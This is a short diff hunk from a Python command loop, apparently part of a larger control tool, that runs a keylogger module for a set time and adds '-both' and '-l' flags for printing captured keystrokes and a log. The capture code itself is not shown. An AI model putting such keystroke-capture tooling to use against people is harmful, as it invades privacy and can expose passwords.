@@ -34,10 +34,18 @@ while True:
         if '-t' in cmd:
             keylTime = int(cmd[cmd.index('-t') + 1])
         keylog = keyl.Keylogger(keylTime)
-        log = keylog.run()
+        keys = keylog.run()
         print('Finished')
-        for i in log:
-            print(f'{i}: {log[i]}')
+        if '-both' in cmd:
+            for i in keys:
+                print(f'{i}: {keys[i]}')
+            print(f'Log: {keylog.getLog()}')
+        elif '-l' in cmd:
+            print(f'Log: {keylog.getLog()}')
+        else:
+            for i in keys:
+                print(f'{i}: {keys[i]}')
+
 
     elif cmd[0] == 'app':
         if cmd[1] == 'list':
